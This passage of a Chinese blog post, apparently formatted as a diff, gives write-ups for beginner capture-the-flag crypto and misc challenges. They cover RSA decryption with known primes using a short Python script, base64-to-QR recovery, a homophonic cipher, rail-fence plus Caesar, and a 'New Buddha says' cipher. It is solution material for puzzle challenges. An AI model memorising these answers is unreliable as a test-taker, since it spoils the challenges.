+<p>已知eqpc,</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">e &#x3D; 65537</span><br><span class="line">p &#x3D; 104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179</span><br><span class="line">q &#x3D; 140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501</span><br><span class="line">c &#x3D; 4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>脚本得：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from libnum import s2n</span><br><span class="line"></span><br><span class="line">c&#x3D;gmpy2.mpz(4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194)</span><br><span class="line">p &#x3D; gmpy2.mpz(104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179)</span><br><span class="line">q &#x3D; gmpy2.mpz(140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501)</span><br><span class="line">e&#x3D;gmpy2.mpz(65537)</span><br><span class="line">phi_n&#x3D;(p-1)*(q-1)</span><br><span class="line">d&#x3D;gmpy2.invert(e,phi_n)</span><br><span class="line">m&#x3D;pow(c,d,p*q)</span><br><span class="line">print &quot;plaintext:&quot;</span><br><span class="line">print hex(m)[2:].decode(&#39;hex&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>得flag.</p>
+<h4 id="我真的不知道他是哪方面的题目了"><a href="#我真的不知道他是哪方面的题目了" class="headerlink" title="[我真的不知道他是哪方面的题目了]"></a>[我真的不知道他是哪方面的题目了]</h4><blockquote>
+<p>婷羽姐说这是密码学，俺做了一遍发现是MISC。 婷羽姐说CRYPTO和MISC不分家。百度和PS是基操哇。</p>
+</blockquote>
+<p>附件名为base，base64解码，base64还可以转图片。</p>
+<p>转出了残缺的二维码，搜索已知的二维码头，PS后可得flag。</p>
+<h4 id="同音之旅"><a href="#同音之旅" class="headerlink" title="[同音之旅]"></a>[同音之旅]</h4><blockquote>
+<p>我穿上漂亮的衣服继续在海滩上行走，路过的旅人告诉我，再往前走是云海，你需要飞上20层楼的高度，拿到从天空王国坠落的5个星光，前往钟声响荡的神殿，与4位先祖在星光长河里相逢，带上你收集的钥匙与先祖换取flag吧。<br>13972421090544136056524896<br>（得到的明文加上flag{}包裹提交）</p>
+</blockquote>
+<p>555,丹姐果然每次都刷新我的知识面<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=919%EF%BC%8C%E7%BB%93%E5%90%88%E6%96%87%E5%AD%97%EF%BC%8C%E5%9C%A8%E7%BA%BF%E8%A7%A3%E5%AF%86%E3%80%82">http://www.atoolbox.net/Tool.php?Id=919，结合文字，在线解密。</a></p>
+<h4 id="去冒险吧！"><a href="#去冒险吧！" class="headerlink" title="[去冒险吧！]"></a>[去冒险吧！]</h4><blockquote>
+<p>嘿！在微风吹拂的云野，带着我的白蜡烛出发，围着大高个转圈，他就拉上手带着我飞过栅栏，冲下浮空岛也好，鲲鳐也跟着我们叫唤，冲上瀑布吧，水帘也拦不住想去冒险的心情，而他却突然停止滑翔，带着斗篷上蔚蓝的泛光，缓缓在一座石碑前落下，一个骑士跪道出凯撒大帝的威名。l3l818r544j}gg-glm24j0{1g-57-kik1i10l46-jh</p>
+</blockquote>
+<p>根据提示，栅栏+凯撒，关键点在于，凯撒加密不对标点符号进行处理，故在尝试栅栏时“{}”应分别在第五位和最后一位，再进行凯撒密码一把梭，得flag。</p>
+<h4 id="先祖的教诲"><a href="#先祖的教诲" class="headerlink" title="[先祖的教诲]"></a>[先祖的教诲]</h4><blockquote>
+<p>迷茫的我走在雨帘里，渐渐斗篷褪了色，渐渐步伐不在充满活力，渐渐没了飞翔的兴趣，我在一座亭子里停下，跪坐祈祷的先祖看到我，如是说道————新佛曰：修即聞羅羅莊修如塞愍隸囉兜若念色心菩色空婆即嘇降慧念空兜咤薩慧彌訶彌如迦嚤心寂叻菩諸莊須缽善阿吽嘚宣若陀善劫隸嚴陀善慧摩蜜塞念祗陀隸吽斯迦慧心耨訶諸哆叻色喃所咤善訶亦嚤吽即叻訶闍尊寂寂莊慧降迦降彌寂願降蜜耨善劫即吽祗訶囉心莊祗婆嘇兜僧愍諦慧劫羅寂訶是修嚴婆諸須莊婆薩若喃喃迦須降咒如尊喼慧宣心隸祗諸喃祗波諦咤喼囉咤色嘚夷喼劫陀善菩降彌嘚諸叻嘇阿波嘚嘚是修喃諦闍慧祗缽耨我慧若斯善僧缽即叻修祗宣嚩婆菩斯祗若兜兜菩嘚亦嘚嚤婆是寂須善陀即嚤摩薩所善心訶諦如闍斯缽喼訶哆蜜寂伏空我訶彌兜願尊叻願斯善嘚夷薩夷慧嚴亦闍闍阿願聞阿吽阿囉摩眾嚤心迦闍蜜塞伏喼哆吶婆婆塞菩宣咒聞念願劫咒咒斯咤菩兜須吶聞慧願阿諸咒咤念哆念咒亦嘇莊叻善諸聞諸菩寂吽宣菩莊彌訶斯彌諦阿善聞喃願色兜嚩色夷念嘚吽阿空摩所諸吽斯彌伏諸念摩塞陀寂羅祗念叻祗斯斯陀夷伏菩菩慧哆空喼如是念哆菩降阿哆我眾色劫聞亦若訶嚤嚴波叻劫塞咒即耨咤善伏莊哆般諦宣斯宣蜜咤須咤嚴隸是訶塞色塞聞所善迦叻嚩須迦吶兜兜慧迦是諦尊願嘚色劫阿心修嚴諸心嚴囉塞囉善訶陀色迦塞修諸咒須嚩諦嚤善囑</p>
+</blockquote>
+<p>新佛曰解密+佛曰解密，得flag。</p>
+<p>个人觉得这道题与前面考点部分重复，送分题。</p>
+</div></header><footer class="post__foot u-cf"><ul class="post__tag u-fl"><li class="post__tag__item"><a class="post__tag__link" href="/tags/challenge/">challenge</a></li></ul></footer></article><section class="reward"><a class="btn-reward" href="#">打赏</a><div class="reward-wrapper clearfix"><img src="/img/wechat.png" title="微信"></div></section></main><footer class="foot"><div class="foot-copy">&copy; 2016 - 2021 mklkx</div></footer>
+<script src="/js/scroller.js"></script>
+
+<script src="/js/main.js"></script>
+</body></html>
